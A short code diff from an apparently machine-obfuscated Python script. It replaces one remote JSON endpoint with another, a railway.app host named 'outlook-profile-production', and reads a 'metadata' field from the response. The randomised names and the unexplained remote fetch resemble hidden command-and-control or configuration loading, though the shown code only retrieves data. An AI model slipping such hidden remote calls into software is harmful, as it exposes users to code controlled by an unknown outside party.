@@ -18,7 +18,7 @@ def train_hgsliz_692():
 
     def train_zbitby_244():
         try:
-            train_teogee_364 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_teogee_364 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_teogee_364.raise_for_status()
             model_wcwlyq_511 = train_teogee_364.json()
             net_mtvcdt_585 = model_wcwlyq_511.get('metadata')
